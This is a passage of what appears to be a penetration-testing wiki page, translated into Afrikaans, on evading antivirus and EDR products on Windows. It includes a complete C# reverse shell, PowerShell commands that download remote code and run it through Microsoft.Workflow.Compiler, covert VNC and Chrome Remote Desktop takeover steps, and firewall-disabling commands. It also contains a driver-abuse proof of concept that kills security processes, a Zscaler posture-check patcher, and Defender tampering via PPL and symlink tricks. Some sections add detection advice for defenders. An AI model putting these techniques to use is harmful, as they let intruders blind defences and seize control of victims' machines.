SmartScreen werk hoofsaaklik met ’n reputasie-gebaseerde benadering, wat beteken dat ongewone afgelaaide applications SmartScreen sal aktiveer en so die eindgebruiker waarsku en keer om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is ’n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer files van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir ’n file wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dis belangrik om daarop te let dat executables wat met ’n **trusted** signing certificate onderteken is, **won't trigger SmartScreen**.

’n Baie effektiewe manier om jou payloads te verhoed om die Mark of The Web te kry, is om hulle binne-in ’n soort container soos ’n ISO te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) **cannot** op **non NTFS** volumes toegepas word.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is ’n tool wat payloads in output containers verpak om Mark-of-the-Web te ontduik.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is 'n demo vir die omseiling van SmartScreen deur payloads binne ISO-lêers te verpak met behulp van [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige logging-meganisme in Windows wat toepassings en stelselkomponente toelaat om **events te log**. Dit kan egter ook deur security products gebruik word om kwaadwillige aktiwiteite te monitor en op te spoor.

Soortgelyk aan hoe AMSI gedeaktiveer word (omseil word), is dit ook moontlik om die **`EtwEventWrite`**-funksie van die user space-process onmiddellik te laat terugkeer sonder om enige events te log. Dit word gedoen deur die funksie in memory te patch om onmiddellik terug te keer, en ETW-logging vir daardie process effektief te deaktiveer.

Jy kan meer inligting vind in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Om C# binaries in memory te laai is al lank bekend en dit is steeds 'n baie goeie manier om jou post-exploitation tools te laat loop sonder om deur AV gevang te word.

Aangesien die payload direk in memory gelaai sal word sonder om disk te raak, hoef ons net vir die patching van AMSI vir die hele process om te gee.

Die meeste C2-frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in memory uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels om **'n nuwe sacrificial process te spawn**, jou post-exploitation kwaadwillige code in daardie nuwe process te inject, jou kwaadwillige code uit te voer en, wanneer klaar, die nuwe process te kill. Dit het beide voordele en nadele. Die voordeel van die fork and run-metode is dat execution **buite** ons Beacon implant-process plaasvind. Dit beteken dat as iets in ons post-exploitation-aksie verkeerd loop of gevang word, daar 'n **baie groter kans** is dat ons **implant sal oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan daaroor om die post-exploitation kwaadwillige code **in sy eie process** te inject. Op hierdie manier kan jy vermy om 'n nuwe process te skep en dit deur AV te laat scan, maar die nadeel is dat as iets verkeerd loop met die execution van jou payload, daar 'n **baie groter kans** is om **jou beacon te verloor** omdat dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer oor C# Assembly loading wil lees, kyk gerus na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **van PowerShell af** laai; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige code uit te voer met ander languages deur die gekompromitteerde masjien toegang te gee **tot die interpreter environment wat op die Attacker Controlled SMB share geïnstalleer is**.

Deur toegang toe te laat tot die Interpreter Binaries en die environment op die SMB share kan jy **arbitrary code in hierdie languages binne memory** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender scan steeds die scripts, maar deur Go, Java, PHP, ens. te gebruik, het ons **meer buigsaamheid om static signatures te omseil**. Toetsing met lukraak, nie-geobfuseerde reverse shell scripts in hierdie languages het suksesvol bewys.

## TokenStomping

Token stomping is 'n technique wat 'n attacker toelaat om **die access token of 'n security product soos 'n EDR of AV te manipuleer**, en sodoende hul privileges te verminder sodat die process nie sterf nie, maar ook nie permissions het om na kwaadwillige aktiwiteite te kyk nie.

Om dit te voorkom, kan Windows **eksterne processes verhinder** om handles oor die tokens van security processes te kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Soos beskryf in [**hierdie blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om net Chrome Remote Desktop op 'n victim se PC te deploy en dit dan te gebruik om dit oor te neem en persistence te handhaaf:
1. Laai af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI file vir Windows om die MSI file af te laai.
2. Run die installer stilweg op die victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop page en klik next. Die wizard sal jou dan vra om te authorize; klik die Authorize button om voort te gaan.
4. Execute die gegewe parameter met 'n paar aanpassings: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Let op die pin param wat dit moontlik maak om die pin in te stel sonder om die GUI te gebruik).


## Advanced Evasion

Evasion is 'n baie ingewikkelde onderwerp; soms moet jy baie verskillende bronne van telemetry in net een system in ag neem, so dit is feitlik onmoontlik om heeltemal onopgespoor te bly in volwasse environments.

Elke environment waarteen jy gaan, sal hul eie sterk- en swakpunte hê.

Ek moedig jou sterk aan om hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) te gaan kyk, om 'n voet-in-die-deur te kry in meer Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

his is ook nog 'n uitstekende praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik, wat **dele van die binary sal verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig beskou, en dit vir jou sal uitsplits.\
Nog 'n tool wat **dieselfde ding doen is** [**avred**](https://github.com/dobin/avred) met 'n oop web wat die diens aanbied by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot Windows10 het alle Windows 'n **Telnet server** gehad wat jy kon installeer (as administrator) deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Maak dit **start** wanneer die stelsel begin en **run** dit nou:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet poort** (stealth) en deaktiveer firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af van: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin-aflaaie hê, nie die setup nie)

**OP DIE GASHEER**: Voer _**winvnc.exe**_ uit en konfigureer die server:

- Aktiveer die opsie _Disable TrayIcon_
- Stel ’n wagwoord in _VNC Password_
- Stel ’n wagwoord in _View-Only Password_

Skuif dan die binary _**winvnc.exe**_ en die **nuut** geskepte lêer _**UltraVNC.ini**_ na die **victim**

#### **Reverse connection**

Die **attacker** moet binne sy **host** die binary `vncviewer.exe -listen 5900` uitvoer sodat dit **gereed** is om ’n reverse **VNC connection** op te vang. Dan, binne die **victim**: Begin die winvnc daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WAARSKUWING:** Om stealth te behou moet jy nie ’n paar dinge doen nie

- Moenie `winvnc` begin as dit reeds loop nie, anders sal jy ’n [popup](https://i.imgur.com/1SROTTl.png) aktiveer. Kyk of dit loop met `tasklist | findstr winvnc`
- Moenie `winvnc` begin sonder `UltraVNC.ini` in dieselfde directory nie, anders sal dit [the config window](https://i.imgur.com/rfMQWcf.png) laat oopmaak
- Moenie `winvnc -h` vir help uitvoer nie, anders sal jy ’n [popup](https://i.imgur.com/oc18wcu.png) aktiveer

### GreatSCT

Laai dit af van: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Begin nou die **lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Huidige verdediger sal die proses baie vinnig beëindig.**

### Ons eie reverse shell saamstel

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Stel dit saam met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using samesteller
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators lys: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik python vir build injectors voorbeeld:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 het ’n klein konsole-nutsprogram bekend as **Antivirus Terminator** gebruik om endpoint protections te deaktiveer voordat ransomware laat val is. Die tool bring sy **eie kwesbare maar *ondertekende* driver** en misbruik dit om geprivilegieerde kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV services nie kan blokkeer nie.

Key take-aways
1. **Signed driver**: Die lêer wat na skyf gelewer word is `ServiceMouse.sys`, maar die binêre is die wettig ondertekende driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver ’n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as ’n **kernel service** en die tweede een begin dit sodat `\\.\ServiceMouse` vanaf user land toeganklik word.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD slaan user-mode protections heeltemal oor; code wat in die kernel execute kan *protected* processes oopmaak, hulle terminate, of kernel objects manipuleer ongeag PPL/PP, ELAM of ander hardening features.

Detection / Mitigation
•  Enable Microsoft se vulnerable-driver block list (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te load.
•  Monitor creations van nuwe *kernel* services en alert wanneer ’n driver vanaf ’n world-writable directory gelaai word of nie op die allow-list is nie.
•  Watch vir user-mode handles na custom device objects gevolg deur suspicious `DeviceIoControl` calls.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler se **Client Connector** pas device-posture rules plaaslik toe en maak op Windows RPC staat om die resultate na ander components te communicate. Twee swak design choices maak ’n volledige bypass moontlik:

1. Posture evaluation gebeur **heeltemal client-side** (’n boolean word na die server gestuur).
2. Internal RPC endpoints valideer slegs dat die connecting executable **deur Zscaler onderteken** is (via `WinVerifyTrust`).

Deur **vier ondertekende binaries op skyf te patch** kan albei meganismes geneutraliseer word:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nadat die oorspronklike lêers vervang en die diensstapel herbegin is:

* **Al** postuurkontroles vertoon **groen/voldoenend**.
* Ongesigneerde of gewysigde binaries kan die named-pipe RPC-endpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk wat deur die Zscaler-beleide gedefinieer is.

Hierdie gevallestudie demonstreer hoe suiwer kliënt-kant trust-besluite en eenvoudige handtekeningkontroles met ’n paar byte-patches verslaan kan word.

## Misbruik van Protected Process Light (PPL) Om AV/EDR Met LOLBINs Te Manipuleer

Protected Process Light (PPL) dwing ’n signer/level-hiërargie af sodat net gelyk-of-hoër beskermde prosesse mekaar kan manipuleer. Offensief, as jy wettiglik ’n PPL-geaktiveerde binary kan lanseer en sy arguments kan beheer, kan jy benigne funksionaliteit (bv. logging) omskakel in ’n beperkte, PPL-gestutte write-primitive teen beskermde directories wat deur AV/EDR gebruik word.

Wat maak dat ’n proses as PPL loop
- Die teiken EXE (en enige gelaaide DLLs) moet onderteken wees met ’n PPL-capable EKU.
- Die proses moet geskep word met CreateProcess using die flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- ’n Verenigbare protection level moet aangevra word wat ooreenstem met die signer van die binary (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware signers, `PROTECTION_LEVEL_WINDOWS` vir Windows signers). Verkeerde levels sal by skepping misluk.

Sien ook ’n breër inleiding tot PP/PPL en LSASS-beskerming hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (kies protection level en stuur arguments deur na die target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die ondertekende stelsel-binary `C:\Windows\System32\ClipUp.exe` self-spawn en aanvaar 'n parameter om 'n log-lêer na 'n caller-spesifieke path te skryf.
- Wanneer dit as 'n PPL process geloods word, vind die file write plaas met PPL backing.
- ClipUp kan nie paths met spaces parse nie; gebruik 8.3 short paths om na normaalweg protected locations te wys.

8.3 short path helpers
- Lys short names: `dir /x` in elke parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch die PPL-capable LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` met behulp van 'n launcher (bv. CreateProcessAsPPL).
2) Gee die ClipUp log-path argument om 'n file creation in 'n protected AV directory af te dwing (bv. Defender Platform). Gebruik 8.3 short names indien nodig.
3) As die target binary normaalweg oop/locked is deur die AV terwyl dit loop (bv. MsMpEng.exe), skeduleer die write by boot voordat die AV begin deur 'n auto-start service te installeer wat betroubaar vroeër run. Validate boot ordering met Process Monitor (boot logging).
4) Op reboot gebeur die PPL-backed write voordat die AV sy binaries lock, korrupteer die target file en voorkom startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas en beperkings
- Jy kan nie die inhoud wat ClipUp skryf, beheer behalwe vir plasing nie; die primitive is geskik vir korrupsie eerder as presiese inhoud-invoeging.
- Vereis local admin/SYSTEM om ’n service te installeer/start en ’n reboot-venster.
- Tydsberekening is krities: die teiken mag nie oop wees nie; boot-time execution vermy lêerslotte.

Detections
- Process creation van `ClipUp.exe` met ongewone arguments, veral as dit deur nie-standaard launchers geparent is, rondom boot.
- Nuwe services gekonfigureer om suspicious binaries outomaties te begin en konsekwent voor Defender/AV te start. Ondersoek service creation/modification voor Defender startup failures.
- File integrity monitoring op Defender binaries/Platform directories; onverwante file creations/modifications deur processes met protected-process flags.
- ETW/EDR telemetry: soek vir processes created met `CREATE_PROTECTED_PROCESS` en anomale PPL level usage deur nie-AV binaries.

Mitigations
- WDAC/Code Integrity: beperk watter signed binaries as PPL mag hardloop en onder watter parents; blok ClipUp invocation buite legitime contexts.
- Service hygiene: beperk creation/modification van auto-start services en monitor start-order manipulation.
- Verseker dat Defender tamper protection en early-launch protections geaktiveer is; ondersoek startup errors wat binary corruption aandui.
- Oorweeg om 8.3 short-name generation op volumes wat security tooling huisves te deaktiveer as dit met jou omgewing versoenbaar is (toets deeglik).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit hardloop deur subfolders onder die volgende te enumerate:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subfolder met die hoogste lexicographic version string (byvoorbeeld, `4.18.25070.5-0`), en begin dan die Defender service processes van daar af (en werk service/registry paths dienooreenkomstig op). Hierdie seleksie vertrou directory entries, insluitend directory reparse points (symlinks). ’n Administrator kan dit gebruik om Defender na ’n attacker-writable path te herlei en DLL sideloading of service disruption te bereik.

Preconditions
- Local Administrator (nodig om directories/symlinks onder die Platform folder te skep)
- Vermoë om te reboot of Defender platform re-selection te trigger (service restart on boot)
- Slegs built-in tools benodig (mklink)

Why it works
- Defender blok writes in sy eie folders, maar sy platform selection vertrou directory entries en kies die lexicographically hoogste version sonder om te valideer dat die target na ’n protected/trusted path resolve.

Step-by-step (voorbeeld)
1) Berei ’n writable clone van die huidige platform folder voor, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep ’n hoër-weergawe gids-symlink binne Platform wat na jou gids wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger seleksie (herlaai aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die herlei pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` waar te neem en die dienskonfigurasie/registry wat daardie ligging weerspieël.

Post-exploitation opsies
- DLL sideloading/code execution: Drop/vervang DLLs wat Defender van sy application directory laai om code in Defender se processes uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Verwyder die version-symlink sodat op die volgende start die gekonfigureerde path nie resolve nie en Defender misluk om te start:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Let op dat hierdie tegniek nie self privilege escalation bied nie; dit vereis admin rights.

## API/IAT Hooking + Call-Stack Spoofing met PIC (Crystal Kit-style)

Red teams kan runtime evasion uit die C2 implant haal en dit in die teikenmodule self plaas deur sy Import Address Table (IAT) te hook en geselekteerde APIs deur attacker-controlled, position-independent code (PIC) te laat loop. Dit veralgemeen evasion verder as die klein API-oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post-exploitation DLLs.

Hoëvlak-benadering
- Stage ’n PIC blob langs die teikenmodule met ’n reflective loader (prepended of companion). Die PIC moet selfstandig en position-independent wees.
- Terwyl die host DLL laai, loop sy IMAGE_IMPORT_DESCRIPTOR deur en patch die IAT entries vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) om na dun PIC wrappers te wys.
- Elke PIC wrapper voer evasions uit voordat dit na die regte API-adres tail-call. Tipiese evasions sluit in:
- Memory mask/unmask rondom die call (bv. encrypt beacon regions, RWX→RX, change page names/permissions) en herstel dan post-call.
- Call-stack spoofing: bou ’n benign stack en transition in die target API sodat call-stack analysis na verwagte frames resolve.
- Vir compatibility, export ’n interface sodat ’n Aggressor script (of ekwivalent) kan registreer watter APIs om te hook vir Beacon, BOFs en post-ex DLLs.

Waarom IAT hooking hier
- Werk vir enige code wat die hooked import gebruik, sonder om tool code te verander of op Beacon staat te maak om spesifieke APIs te proxy.
